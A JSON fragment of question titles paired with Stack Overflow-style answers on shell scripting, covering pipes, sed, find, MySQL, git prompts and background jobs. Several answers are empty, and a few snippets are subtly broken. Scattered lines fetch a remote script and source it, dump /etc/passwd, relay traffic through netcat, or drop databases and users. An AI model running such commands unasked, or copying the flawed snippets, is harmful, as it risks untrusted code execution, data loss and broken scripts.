    "pipe stdout and stderr to two different processes in shell script?": "Use another file descriptor\n{ command1 2>&3 | command2; } 3>&1 1>&2 | command3\nYou can use up to 7 other file descriptors: from 3 to 9.\nIf you want more explanation, please ask, I can explain ;-)\nTest\n{ { echo a; echo >&2 b; } 2>&3 | sed >&2 's/$/1/'; } 3>&1 1>&2 | sed 's/$/2/'\noutput:\nb2\na1\nExample\nProduce two log files:\n1. stderr only\n2. stderr and stdout\n{ { { command 2>&1 1>&3; } | tee err-only.log; } 3>&1; } > err-and-stdout.log\nIf command is echo \"stdout\"; echo \"stderr\" >&2 then we can test it like that:\n$ { { { echo out>&3;echo err>&1;}| tee err-only.log;} 3>&1;} > err-and-stdout.log\n$ head err-only.log err-and-stdout.log\n==> err-only.log <==\nerr\n\n==> err-and-stdout.log <==\nout\nerr",
    "Concise and portable \"join\" on the Unix command-line": "Perhaps a little surprisingly, paste is a good way to do this:\npaste -s -d\",\"\nThis won't deal with the empty lines you mentioned. For that, pipe your text through grep, first:\ngrep -v '^$' | paste -s -d\",\" -",
    "What are the error exit values for diff?": "It depends on your diff command. Mine (GNU diffutils 3.0) says:\nAn exit status of 0 means no differences were found, 1 means some differences were found, and 2 means trouble. Normally, differing binary files count as trouble, but this can be altered by using the -a or --text option, or the -q or --brief option.",
    "Execute Shell Script after post build in Jenkins": "",
    "How to delete mysql database through shell command": "Try the following command:\nmysqladmin -h[hostname/localhost] -u[username] -p[password] drop [database]",
    "Is it possible to go into ipython from code?": "There is an ipdb project which embeds iPython into the standard pdb, so you can just do:\nimport ipdb; ipdb.set_trace()\nIt's installable via the usual pip install ipdb.\nipdb is pretty short, so instead of easy_installing you can also create a file ipdb.py somewhere on your Python path and paste the following into the file:\nimport sys\nfrom IPython.Debugger import Pdb\nfrom IPython.Shell import IPShell\nfrom IPython import ipapi\n\nshell = IPShell(argv=[''])\n\ndef set_trace():\n    ip = ipapi.get()\n    def_colors = ip.options.colors\n    Pdb(def_colors).set_trace(sys._getframe().f_back)",
    "Using Bash to display a progress indicator (spinner) [duplicate]": "In this example using SCP, I'm demonstrating how to grab the process id (pid) and then do something while that process is running.\nThis displays a simple spinnng icon.\n/usr/bin/scp me@website.com:file somewhere 2>/dev/null &\npid=$! # Process Id of the previous running command\n\nspin[0]=\"-\"\nspin[1]=\"\\\\\"\nspin[2]=\"|\"\nspin[3]=\"/\"\n\necho -n \"[copying] ${spin[0]}\"\nwhile [ kill -0 $pid ]\ndo\n  for i in \"${spin[@]}\"\n  do\n        echo -ne \"\\b$i\"\n        sleep 0.1\n  done\ndone\nWilliam Pursell's solution\n/usr/bin/scp me@website.com:file somewhere 2>/dev/null &\npid=$! # Process Id of the previous running command\n\nspin='-\\|/'\n\ni=0\nwhile kill -0 $pid 2>/dev/null\ndo\n  i=$(( (i+1) %4 ))\n  printf \"\\r${spin:$i:1}\"\n  sleep .1\ndone",
    "Get wireless SSID through shell script on Mac OS X [closed]": "The command\n/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -I\nwill give you details about your current wireless network connection.\nTo get specifically the SSID, use this command:\n/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -I | awk -F: '/ SSID/{print $2}'\nTo retrieve SSID names that might have colons as well as spaces:\n/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -I  | awk -F' SSID: '  '/ SSID: / {print $2}'",
    "Delete all broken symbolic links with a line?": "Here's a POSIX way of deleting all broken symbolic links in the current directory, without recursion. It works by telling find to traverse symbolic links (-L), but stopping (-prune) at every directory-or-symbolic-link-to-such.\nfind -L . -name . -o -type d -prune -o -type l -exec rm {} +\nYou can also use a shell loop. The test -L matches symbolic links, and -e matches existing files (excluding broken symlinks).\nfor x in * .[!.]* ..?*; do if [ -L \"$x\" ] && ! [ -e \"$x\" ]; then rm -- \"$x\"; fi; done\nIf you want to recurse into subdirectories, this technique doesn't work. With GNU find (as found on non-embedded Linux and Cygwin), you can use the -xtype predicate to detect broken symbolic links (-xtype uses the type of the target for symbolic links, and reports l for broken links).\nfind -xtype l -delete\nPOSIXly, you need to combine two tools. You can use find -type l -exec \u2026 to invoke a command on each symbolic link, and [ -e \"$x\" ] to test whether that link is non-broken.\nfind . -type l -exec sh -c 'for x; do [ -e \"$x\" ] || rm \"$x\"; done' _ {} +\nThe simplest solution is to use zsh. To delete all broken symbolic links in the current directory:\nrm -- *(-@D)\nThe characters in parentheses are glob qualifiers: - to dereference symlinks, @ to match only symlinks (the combination -@ means broken symlinks only), and D to match dot files. To recurse into subdirectories, make that:\nrm -- **/*(-@D)",
    "How to convert DATE to UNIX TIMESTAMP in shell script on MacOS": "date +%s\nThis works fine for me on OS X Lion.",
    "using rot13 and tr command for having an encrypted email address": "Not sure exactly how you want to use this, but here's a basic example to get you started:\necho 'fooman@example.com' | tr 'A-Za-z' 'N-ZA-Mn-za-m'\nTo make it easier, you can alias the tr command in your .bashrc file thusly:\nalias rot13=\"tr 'A-Za-z' 'N-ZA-Mn-za-m'\"\nNow you can just call:\necho 'fooman@example.com' | rot13",
    "Commandline hexdump with ASCII output?": "hexdump -C does what you want.\n# hexdump -C /etc/passwd\n00000000  72 6f 6f 74 3a 78 3a 30  3a 30 3a 72 6f 6f 74 3a  |root:x:0:0:root:|\n00000010  2f 72 6f 6f 74 3a 2f 62  69 6e 2f 62 61 73 68 0a  |/root:/bin/bash.|\n00000020  64 61 65 6d 6f 6e 3a 78  3a 31 3a 31 3a 64 61 65  |daemon:x:1:1:dae|\n00000030  6d 6f 6e 3a 2f 75 73 72  2f 73 62 69 6e 3a 2f 62  |mon:/usr/sbin:/b|\n00000040  69 6e 2f 73 68 0a 62 69  6e 3a 78 3a 32 3a 32 3a  |in/sh.bin:x:2:2:|\n00000050  62 69 6e 3a 2f 62 69 6e  3a 2f 62 69 6e 2f 73 68  |bin:/bin:/bin/sh|\n...",
    "VSCode Integrated Terminal Doesn't Load .bashrc or .bash_profile": "Why?\nThe reason for the behavior is because .bashrc (indirectly, through /etc/profile) is only loaded for login shells, and the shell being launched is not a \"login shell\" nor has it inherited its environment/state by being launched from a login shell.\nHow to Fix?\nThe simplest way to correct the behavior (without changing any default system/profile configuration files) is to pass a -l (--login) option to bash instructing it to behave as a \"login shell\".\nIn VSCode this can be done from user/global settings (ie. the settings.json file), the location of the user settings file and the config setting that needs to be modified varies by OS:\nLinux\nLocation: $HOME/.config/Code/User/settings.json\nSetting:\n    \"terminal.integrated.profiles.linux\": {\n        \"bash\": {\n            \"path\": \"/bin/bash\",\n            \"icon\": \"terminal-bash\",\n            \"args\": [\n                \"-l\"\n            ]\n        }\n    }\nmacOS\nLocation: $HOME/Library/Application Support/Code/User/settings.json\nSetting:\n    \"terminal.integrated.profiles.osx\": {\n        \"bash\": {\n            \"path\": \"/bin/bash\",\n            \"icon\": \"terminal-bash\",\n            \"args\": [\n                \"-l\"\n            ]\n        }\n    }\nWindows\nLocation: %USERPROFILE%\\AppData\\Roaming\\Code\\User\\settings.json\nSetting:\n    \"terminal.integrated.profiles.windows\": {\n        \"bash\": {\n            \"path\": \"C:\\\\Windows\\\\system32\\\\bash.exe\",\n            \"icon\": \"terminal-bash\",\n            \"args\": [\n                \"-l\"\n            ]\n        }\n    }\nThis will cause VSCode to launch bash as a login shell, executing the content of various runcom files (such as .bashrc.)\nSome Notes:\nIf you exit and re-open VSCode with an active Terminal session, that session will be restored and relaunched using the args it was originally launched with (ie. it will not launch using the -l argument you have configured.) You will want to exit all active terminal sessions and start fresh terminal sessions to pick up your configuration change.\nIf you use VSCode settings editor, there is a button at the top right to \"open settings (JSON)\". This is useful when your settings do not have any terminal profiles in it, because you can use tab-completion in VSCode to cause VSCode to emit a full config section reflecting your current terminal profiles config (there is a global default.) This may make it easier to customize.\nIf an older installation of VSCode is in use, first remove the (now legacy) settings terminal.integrated.shell.xxx and terminal.integrated.shellargs.xxx where xxx is one of linux, osx, or windows.\nOn a pedantic note, \".bashrc\" is not a \"profile\" config file, it is a \"runcom\" file (aka \"startup\" file). The standard way to extend a shell profile (bash and a few others) is to modify \"~/.profile\" or \"/etc/profile\" config files, and not \".bashrc\" as many have self-taught themselves to do. Using ~/.profile is a more-portable approach to shell profile management. Anything that is strictly a \"bashism\" should be kept in the bash-specific .bashrc file (meaning if you switch shells you can have a shared profile and not arrive at shell-specific brokenness), virtually every shell has its own runcom file(s).\nReferences:\nunix.stackexchange.com \"Difference between Login Shell and Non-Login Shell\"\nman7.org \"bash(1) man page\"\ngnu.org \"bash manual\"\nsuperuser.com \"What does the 'rc' in .bashrc, etc. mean?\"",
    "How can I read a file and redirect it to a variable?": "in several of a million ways...\nsimplest is probably\nmy_var=$(cat my_file)\nIf you use bash and you want to get spiffy you can use bash4's mapfile, which puts an entire file into an array variable, one line per cell\nmapfile my_var < my_file",
    "One line if/else condition in linux shell scripting": "It looks as if you were on the right track. You just need to add the else statement after the \";\" following the \"then\" statement. Also I would split the first line from the second line with a semicolon instead of joining it with &&.\nmaxline='cat journald.conf | grep \"#SystemMaxUse=\"'; if [ $maxline == \"#SystemMaxUse=\" ]; then sed 's/\\#SystemMaxUse=/SystemMaxUse=50M/g' journald.conf > journald.conf2 && mv journald.conf2 journald.conf; else echo \"This file has been edited. You'll need to do it manually.\"; fi\nAlso in your original script, when declaring maxline you used back-ticks \"`\" instead of single quotes \"'\" which might cause problems.",
    "Single command to create a file and set its permission": "install -m 777 /dev/null filename.txt",
    "Exclude all permission denied messages from \"du\"": "du -cBM --max-depth=1 2>/dev/null | sort -n \nor better in bash (just filter out this particular error, not all like last snippet)\ndu -cBM --max-depth=1 2> >(grep -v 'Permission denied') | sort -n ",
    "Get the SQL query result without the table format": "Add the -B flag to mysql.\nmysql -B -u username -ppassword \\\n    --disable-column-names \\\n    --execute \"select name from mydb.test\"\n-B, --batch: Print results in nontabular output format.\n\n--execute: Execute the statement and quit.\nNote that -B/--batch also enables the --silent switch.",
    "-bash: __git_ps1: command not found": "Run the following:\n$ curl -L https://raw.github.com/git/git/master/contrib/completion/git-prompt.sh > ~/.bash_git\nAnd add this to the top of your ~/.bashrc:\nsource ~/.bash_git\nRe-login to your shell and you should be set.",
    "unzip password protected zip in unix": "unzip -P your-password zipfile.zip\nman unzip\n-P password\nuse password to decrypt encrypted zipfile entries (if any). THIS IS INSECURE! Many multi-user operating systems provide ways for any user to see the current command line of any other user; even on stand-alone systems there is always the threat of over-the-shoulder peeking. Storing the plaintext password as part of a command line in an automated script is even worse. Whenever possible, use the non-echoing, interactive prompt to enter passwords. (And where security is truly important, use strong encryption such as Pretty Good Privacy instead of the relatively weak encryption provided by standard zipfile utilities.)",
    "How can I tell which Unix shell I am using? [duplicate]": "Try:\necho $0\nThis often works across a range of shells.",
    "Adding Counter in shell script": "Here's how you might implement a counter:\ncounter=0\nwhile true; do\n  if /home/hadoop/latest/bin/hadoop fs -ls /apps/hdtech/bds/quality-rt/dt=$DATE_YEST_FORMAT2 then\n       echo \"Files Present\" | mailx -s \"File Present\"  -r admin@host.com admin@host.com\n       exit 0\n  elif [[ \"$counter\" -gt 20 ]]; then\n       echo \"Counter: $counter times reached; Exiting loop!\"\n       exit 1\n  else\n       counter=$((counter+1))\n       echo \"Counter: $counter time(s); Sleeping for another half an hour\" | mailx -s \"Time to Sleep Now\"  -r admin@host.com admin@host.com\n       sleep 1800\n  fi\ndone\nSome Explanations:\ncounter=$((counter+1)) - this is how you can increment a counter. The $ for counter is optional inside the double parentheses in this case.\nelif [[ \"$counter\" -gt 20 ]]; then - this checks whether $counter is not greater than 20. If so, it outputs the appropriate message and breaks out of your while loop.",
    "What does the colon dash \":-\" mean in bash [duplicate]": "It's a parameter expansion, it means if the third argument is null or unset, replace it with what's after :-\n$ x=\n$ echo ${x:-1}\n1\n$ echo $x\n\n$\nThere's also another similar PE that assign the value if the variable is null:\n$ x=\n$ echo ${x:=1}\n1\n$ echo $x\n1\nCheck http://wiki.bash-hackers.org/syntax/pe",
    "How to run shell script file using nodejs?": "You could use \"child process\" module of nodejs to execute any shell commands or scripts with in nodejs. Let me show you with an example, I am running a shell script(hi.sh) with in nodejs.\nhi.sh\necho \"Hi There!\"\nnode_program.js\nconst { exec } = require('child_process');\nvar yourscript = exec('sh hi.sh',\n        (error, stdout, stderr) => {\n            console.log(stdout);\n            console.log(stderr);\n            if (error !== null) {\n                console.log(`exec error: ${error}`);\n            }\n        });\nHere, when I run the nodejs file, it will execute the shell file and the output would be:\nRun\nnode node_program.js\noutput\nHi There!\nYou can execute any script just by mentioning the shell command or shell script in exec callback.",
    "In Windows 7 Git Bash, is there a way to explore the directory at the current location?": "To open Windows Explorer at the current folder, just enter:\nexplorer .",
    "Automate mysql_secure_installation with echo command via a shell script": "I stumbled upon this question but decided to run the queries manually through a Bash script:\n#!/bin/bash\n\n# Make sure that NOBODY can access the server without a password\nmysql -e \"UPDATE mysql.user SET Password = PASSWORD('CHANGEME') WHERE User = 'root'\"\n# Kill the anonymous users\nmysql -e \"DROP USER ''@'localhost'\"\n# Because our hostname varies we'll use some Bash magic here.\nmysql -e \"DROP USER ''@'$(hostname)'\"\n# Kill off the demo database\nmysql -e \"DROP DATABASE test\"\n# Make our changes take effect\nmysql -e \"FLUSH PRIVILEGES\"\n# Any subsequent tries to run queries this way will get access denied because lack of usr/pwd param",
    "Ansible Command module says that '|' is illegal character": "From the doc:\ncommand - Executes a command on a remote node\nThe command module takes the command name followed by a list of space-delimited arguments. The given command will be executed on all selected nodes. It will not be processed through the shell, so variables like $HOME and operations like \"<\", \">\", \"|\", and \"&\" will not work (use the shell module if you need these features).\nshell - Executes a commands in nodes\nThe shell module takes the command name followed by a list of space-delimited arguments. It is almost exactly like the command module but runs the command through a shell (/bin/sh) on the remote node.\nTherefore you have to use shell: dpkg -l | grep python-apt.",
    "python getoutput() equivalent in subprocess [duplicate]": "Use subprocess.Popen:\nimport subprocess\nprocess = subprocess.Popen(['ls', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\nout, err = process.communicate()\nprint(out)\nNote that communicate blocks until the process terminates. You could use process.stdout.readline() if you need the output before it terminates. For more information see the documentation.",
    "How do I use a regex in a shell script?": "To complement the existing helpful answers:\nUsing Bash's own regex-matching operator, =~, is a faster alternative in this case, given that you're only matching a single value already stored in a variable:\nset -- '12-34-5678' # set $1 to sample value\n\nkREGEX_DATE='^[0-9]{2}[-/][0-9]{2}[-/][0-9]{4}$' # note use of [0-9] to avoid \\d\n[[ $1 =~ $kREGEX_DATE ]]\necho $? # 0 with the sample value, i.e., a successful match\nNote that =~ even allows you to define capture groups (parenthesized subexpressions) whose matches you can later access through Bash's special ${BASH_REMATCH[@]} array variable.\nPortability caveat:\nWhile =~ supports EREs (extended regular expressions), it also supports the host platform's specific extensions - it's a rare case of Bash's behavior being platform-dependent; examples:\n\\d to match a digit is supported on macOS, but not on Linux - use [0-9]\n\\< /\\> and \\b (word-boundary assertions) are supported on Linux, but not on macOS, where you must use [[:<:]] / [[:>:]] - none these are POSIX-compliant\nBackreferences (e.g. \\1) work on Linux, but not on macOS (per POSIX, they're only supported in basic regexes (BREs)).\nIf your scripts are designed to run Linux only, you can use a backreference to make matching more robust, by capturing the specific character used as the first separator in a capture group ((...)) and referring to it later with \\1 to ensure that the same separator is matched:Thanks, ibonyun\nkREGEX_DATE='^[0-9]{2}([-/])[0-9]{2}\\1[0-9]{4}$'\nTo remain portable (in the context of Bash), stick to the POSIX ERE specification.\nFurther notes:\n$kREGEX_DATE is used unquoted, which is necessary for the regex to be recognized as such (quoted parts would be treated as literals).\nWhile not always necessary, it is advisable to store the regex in a variable first, because Bash has trouble with regex literals containing \\.\nE.g., on Linux, where \\< is supported to match word boundaries, [[ 3 =~ \\<3 ]] && echo yes doesn't work, but re='\\<3'; [[ 3 =~ $re ]] && echo yes does.\nI've changed variable name REGEX_DATE to kREGEX_DATE (k signaling a (conceptual) constant), so as to ensure that the name isn't an all-uppercase name, because all-uppercase variable names should be avoided to prevent conflicts with special environment and shell variables.",
    "How to download the latest artifact from Artifactory repository?": "",
    "executing shell command in background from script [duplicate]": "Building off of ngoozeff's answer, if you want to make a command run completely in the background (i.e., if you want to hide its output and prevent it from being killed when you close its Terminal window), you can do this instead:\ncmd=\"google-chrome\";\n\"${cmd}\" &>/dev/null & disown;\n&>/dev/null sets the command\u2019s stdout and stderr to /dev/null instead of inheriting them from the parent process.\n& makes the shell run the command in the background.\ndisown removes the \u201ccurrent\u201d job, last one stopped or put in the background, from under the shell\u2019s job control.\nIn some shells you can also use &! instead of & disown; they both have the same effect. Bash doesn\u2019t support &!, though.\nAlso, when putting a command inside of a variable, it's more proper to use eval \"${cmd}\" rather than \"${cmd}\":\ncmd=\"google-chrome\";\neval \"${cmd}\" &>/dev/null & disown;\nIf you run this command directly in Terminal, it will show the PID of the process which the command starts. But inside of a shell script, no output will be shown.\nHere's a function for it:\n#!/bin/bash\n\n# Run a command in the background.\n_evalBg() {\n    eval \"$@\" &>/dev/null & disown;\n}\n\ncmd=\"google-chrome\";\n_evalBg \"${cmd}\";\nAlso, see: Running bash commands in the background properly",
    "diff a directory recursively, ignoring all binary files": "Kind of cheating but here's what I used:\ndiff -r dir1/ dir2/ | sed '/Binary\\ files\\ /d' >outputfile\nThis recursively compares dir1 to dir2, sed removes the lines for binary files(begins with \"Binary files \"), then it's redirected to the outputfile.",
    "Shell variable expansion in git config": "You can't. git-config(1) does not support environment variable expansion, but only limited type conversion and path expansion:\nThe type specifier can be either --int or --bool, to make git config ensure that the variable(s) are of the given type and convert the value to the canonical form (simple decimal number for int, a \"true\" or \"false\" string for bool), or --path, which does some path expansion (see --path below). If no type specifier is passed, no checks or transformations are performed on the value.\nThe documentation for --path states:\n--path\ngit-config will expand leading ~ to the value of $HOME, and ~user to the home directory for the specified user. This option has no effect when setting the value (but you can use git config bla ~/ from the command line to let your shell do the expansion).\nThe term \"expansion\" does not appear in any different context in git-config(1). So how did you even get the idea that it should, given that no such feature is documented anywhere?\nIn order to expand environment variables you have to pre-process the Git config file yourself, i.e. by creating a template file, and expand variables with a script before copying the file to your $HOME directory.\nIf it's about dotfile management, then do, what all people do: Put them in a directory, and add symlinks to this directory from your $HOME.",
    "What does the Bash operator <<< (i.e. triple less than sign) mean?": "It redirects the string to stdin of the command.\nVariables assigned directly before the command in this way only take effect for the command process; the shell remains untouched.",
    "Shell replace CR\\LF by comma": "Try this:\ntr '\\n' ',' < input.txt > output.txt",
    "Example of using named pipes in Linux shell (Bash)": "One of the best examples of a practical use of a named pipe...\nFrom http://en.wikipedia.org/wiki/Netcat:\nAnother useful behavior is using netcat as a proxy. Both ports and hosts can be redirected. Look at this example:\nnc -l 12345 | nc www.google.com 80\nPort 12345 represents the request.\nThis starts a nc server on port 12345 and all the connections get redirected to google.com:80. If a web browser makes a request to nc, the request will be sent to google but the response will not be sent to the web browser. That is because pipes are unidirectional. This can be worked around with a named pipe to redirect the input and output.\nmkfifo backpipe\nnc -l 12345  0<backpipe | nc www.google.com 80 1>backpipe",
    "Ansible playbook shell output": "The debug module could really use some love, but at the moment the best you can do is use this:\n- hosts: all\n  gather_facts: no\n  tasks:\n    - shell: ps -eo pcpu,user,args | sort -r -k1 | head -n5\n      register: ps\n\n    - debug: var=ps.stdout_lines\nIt gives an output like this:\nok: [host1] => {\n    \"ps.stdout_lines\": [\n        \"%CPU USER     COMMAND\",\n        \" 1.0 root     /usr/bin/python\",\n        \" 0.6 root     sshd: root@notty \",\n        \" 0.2 root     java\",\n        \" 0.0 root     sort -r -k1\"\n    ]\n}\nok: [host2] => {\n    \"ps.stdout_lines\": [\n        \"%CPU USER     COMMAND\",\n        \" 4.0 root     /usr/bin/python\",\n        \" 0.6 root     sshd: root@notty \",\n        \" 0.1 root     java\",\n        \" 0.0 root     sort -r -k1\"\n    ]\n}",
    "Debugging monit": "I've had the same problem. Using monit's verbose command-line option helps a bit, but I found the best way was to create an environment as similar as possible to the monit environment and run the start/stop program from there.\n# monit runs as superuser\n$ sudo su\n\n# the -i option ignores the inherited environment\n# this PATH is what monit supplies by default\n$ env -i PATH=/bin:/usr/bin:/sbin:/usr/sbin /bin/sh\n\n# try running start/stop program here\n$\nI've found the most common problems are environment variable related (especially PATH) or permission-related. You should remember that monit usually runs as root.\nAlso if you use as uid myusername in your monit config, then you should change to user myusername before carrying out the test.",
    "Mongodb - Difference between running \"mongo\" and \"mongod\" databases": "I think there is some confusion here.\nmongod is the \"Mongo Daemon\" it's basically the host process for the database. When you start mongod you're basically saying \"start the MongoDB process and run it in the background\". mongod has several default parameters, such as storing data in /data/db and running on port 27017.\nmongo is the command-line shell that connects to a specific instance of mongod. When you run mongo with no parameters it defaults to connecting to the localhost on port 27017. If you run mongo against an invalid machine:port combination then it will fail to connect (and tell you as much).\nIdeally, when doing anything other than just \"playing around\", you'll use the Command Line Parameters for starting mongod. By the same measure you should start the mongo shell with explicit instructions.\nBased on your description, I think you may be encountering an issue regarding the use of default databases. Try starting mongo with the following (where dbname is your database name)\n./mongo localhost:27017/dbname",
    "How to pipe multiple commands into a single command in the shell? (sh, bash, ...)": "Use parentheses ()'s to combine the commands into a single process, which will concatenate the stdout of each of them.\nExample 1 (note that $ is the shell prompt):\n$ (echo zzz; echo aaa; echo kkk) | sort\naaa\nkkk\nzzz\n\nExample 2:\n$ (setopt; unsetopt; set) | sort",
    "Test for empty string with X\"\" [duplicate]": "Fundamentally, because in times now long past, the behaviour of test was more complex and not uniformly defined across different systems (so portable code had to be written carefully to avoid non-portable constructs).\nIn particular, before test was a shell built-in, it was a separate executable (and note that MacOS X still has /bin/test and /bin/[ as executables). When that was the case, writing:\nif [ -z $variable ]\nwhen $variable was empty would invoke the test program via its alias [ with 3 arguments:\nargv[0] = \"[\"\nargv[1] = \"-z\"\nargv[2] = \"]\"\nbecause the variable was empty so there was nothing to expand. So, the safe way of writing the code was:\nif [ -z \"$variable\" ]\nThis works reliably, passing 4 arguments to the test executable. Granted, the test program has been a built-in to most shells for decades, but old equipment dies hard, and so do good practices learned even longer ago.\nThe other problem resolved by the X prefix was what happened if variables include leading dashes, or contain equals or other comparators. Consider (a not desparately good example):\nx=\"-z\"\nif [ $x -eq 0 ]\nIs that an empty string test with a stray (erroneous) argument, or a numeric equality test with a non-numeric first argument? Different systems provided different answers before POSIX standardized the behaviour, circa 1990. So, the safe way of dealing with this was:\nif [ \"X$x\" = \"X0\" ]\nor (less usually, in my experience, but completely equivalently):\nif [ X\"$x\" = X\"0\" ]\nIt was all the edge cases like this, tied up with the possibility that the test was a separate executable, that means that portable shell code still uses double quotes more copiously than the modern shells actually require, and the X-prefix notation was used to ensure that things could not get misinterpreted.",
    "How do I use a pipe in the exec parameter for a find command?": "Try this\nfind /path/to/jpgs -type f -exec sh -c 'jhead -v {} | grep 123' \\; -print\nAlternatively you could try to embed your exec statement inside a sh script and then do:\nfind -exec some_script {} \\;",
    "How to comment out particular lines in a shell script": "You can comment section of a script using a conditional.\nFor example, the following script:\nDEBUG=false\nif ${DEBUG}; then\necho 1\necho 2\necho 3\necho 4\necho 5\nfi\necho 6\necho 7\nwould output:\n6\n7\nIn order to uncomment the section of the code, you simply need to comment the variable:\n#DEBUG=false\n(Doing so would print the numbers 1 through 7.)",
    "Print a character repeatedly in bash [duplicate]": "There's actually a one-liner that can do this:\n    printf \"%0.s-\" {1..10}\nprints\n    ----------\nHere's the breakdown of the arguments passed to printf:\n%s - This specifies a string of any length\n%0s - This specifies a string of zero length, but if the argument is longer it will print the whole thing\n%0.s - This is the same as above, but the period tells printf to truncate the string if it's longer than the specified length, which is zero\n{1..10} - This is a brace expansion that actually passes the arguments \"1 2 3 4 5 6 7 8 9 10\"\n\"-\" - This is an extra character provided to printf, it could be anything (for a \"%\" you must escape it with another \"%\" first, i.e. \"%%\")\nLastly, The default behavior for printf if you give it more arguments than there are specified in the format string is to loop back to the beginning of the format string and run it again.\nThe end result of what's going on here then is that you're telling printf that you want it to print a zero-length string with no extra characters if the string provided is longer than zero. Then after this zero-length string print a \"-\" (or any other set of characters). Then you provide it 10 arguments, so it prints 10 zero-length strings following each with a \"-\".\nIt's a one-liner that prints any number of repeating characters!\nEdit:\nCoincidentally, if you want to print $variable characters you just have to change the argument slightly to use seq rather than brace expansion as follows:\n    printf '%0.s-' $(seq 1 $variable)\nThis will instead pass arguments \"1 2 3 4 ... $variable\" to printf, printing precisely $variable instances of \"-\"",
    "Custom format for time command": "You could use the date command to get the current time before and after performing the work to be timed and calculate the difference like this:\n#!/bin/bash\n\n# Get time as a UNIX timestamp (seconds elapsed since Jan 1, 1970 0:00 UTC)\nT=\"$(date +%s)\"\n\n# Do some work here\nsleep 2\n\nT=\"$(($(date +%s)-T))\"\necho \"Time in seconds: ${T}\"\n\nprintf \"Pretty format: %02d:%02d:%02d:%02d\\n\" \"$((T/86400))\" \"$((T/3600%24))\" \"$((T/60%60))\" \"$((T%60))\"\"\nNotes: $((...)) can be used for basic arithmetic in bash \u2013 caution: do not put spaces before a minus - as this might be interpreted as a command-line option.\nSee also: http://tldp.org/LDP/abs/html/arithexp.html\nEDIT:\nAdditionally, you may want to take a look at sed to search and extract substrings from the output generated by time.\nEDIT:\nExample for timing with milliseconds (actually nanoseconds but truncated to milliseconds here). Your version of date has to support the %N format and bash should support large numbers.\n# UNIX timestamp concatenated with nanoseconds\nT=\"$(date +%s%N)\"\n\n# Do some work here\nsleep 2\n\n# Time interval in nanoseconds\nT=\"$(($(date +%s%N)-T))\"\n# Seconds\nS=\"$((T/1000000000))\"\n# Milliseconds\nM=\"$((T/1000000))\"\n\necho \"Time in nanoseconds: ${T}\"\nprintf \"Pretty format: %02d:%02d:%02d:%02d.%03d\\n\" \"$((S/86400))\" \"$((S/3600%24))\" \"$((S/60%60))\" \"$((S%60))\" \"${M}\"\nDISCLAIMER:\nMy original version said\nM=\"$((T%1000000000/1000000))\"\nbut this was edited out because it apparently did not work for some people whereas the new version reportedly did. I did not approve of this because I think that you have to use the remainder only but was outvoted.\nChoose whatever fits you.",
    "Shell - check if a git tag exists in an if/else statement": "Why so complicated? Here\u2019s a dead-simple solution (based on cad106uk\u2019s approach further down the page):\nversion=1.2.3\n\nif [ $(git tag -l \"$version\") ]; then\n    echo yes\nelse\n    echo no\nfi\nIt is not necessary to compare the output of git tag -l with the version number, because the output will be empty if the version is not found. Therefore it\u2019s sufficient to test if there\u2019s any output at all.\nNote: The quotes around $version are important to avoid false positives. Because if $version is empty for some reason, git tag -l would just list all tags, and the condition would always be true.",
    "Count lines in large files": "Try: sed -n '$=' filename\nAlso cat is unnecessary: wc -l filename is enough in your present way.",
    "How To Run PHP From Windows Command Line in WAMPServer": "",
    "Replace whole line when match found with sed": "You can do it with either of these:\nsed 's/.*six.*/fault/' file     # check all lines\nsed '/six/s/.*/fault/' file     # matched lines -> then remove\nIt gets the full line containing six and replaces it with fault.\nExample:\n$ cat file\nsix\nasdf\none two six\none isix\nboo\n$ sed 's/.*six.*/fault/'  file\nfault\nasdf\nfault\nfault\nboo\nIt is based on this solution to Replace whole line containing a string using Sed\nMore generally, you can use an expression sed '/match/s/.*/replacement/' file. This will perform the sed 's/match/replacement/' expression in those lines containing match. In your case this would be:\nsed '/six/s/.*/fault/' file\nWhat if we have 'one two six eight eleven three four' and we want to include 'eight' and 'eleven' as our \"bad\" words?\nIn this case we can use the -e for multiple conditions:\nsed -e 's/.*six.*/fault/' -e 's/.*eight.*/fault/' file\nand so on.\nOr also:\nsed '/eight/s/.*/XXXXX/; /eleven/s/.*/XXXX/' file",
    "How to kill all subprocesses of shell?": "pkill -P $$\nwill fit (just kills its own descendants)\nAnd here is the help of -P\n   -P, --parent ppid,...\n          Only match processes whose parent process ID is listed.\nand $$ is the process id of the script itself",
    "Execute a file with arguments in Python shell": "Actually, wouldn't we want to do this?\nimport sys\nsys.argv = ['abc.py','arg1', 'arg2']\nexecfile('abc.py')",
    "Creating files with some content with shell script": "You can use a here document:\ncat <<EOF >filename\nfirst line\nsecond line\nthird line\nEOF\nYou can place several of these in the same script.",
    "fork and exec in bash": "Use the ampersand just like you would from the shell.\n#!/usr/bin/bash\nfunction_to_fork() {\n   ...\n}\n\nfunction_to_fork &\n# ... execution continues in parent process ...",
    "How to read mutliline input from stdin into variable and how to print one out in shell(sh,bash)?": "This is working for me:\nmyvar=`cat`\n\necho \"$myvar\"\nThe quotes around $myvar are important.",
    "Remove function definition (unalias equivalent) [duplicate]": "unset -f my_function\nwill remove (or unset) the function my_function",
    "bash: silently kill background function process": "kill $foo_pid\nwait $foo_pid 2>/dev/null\nBTW, I don't know about your massively cool progress bar, but have you seen Pipe Viewer (pv)? http://www.ivarch.com/programs/pv.shtml",
    "Automatically accept installing NPX package [duplicate]": "npx has a --yes flag you can use to bypass the prompt:\nnpx --yes some-npm-package\nThis is undocumented if you run npx --help, but the documentation for this flag is hidden in the command's \"description\" on the NPM website.\nThere is also a --no flag available if you need to reject the prompt instead.",
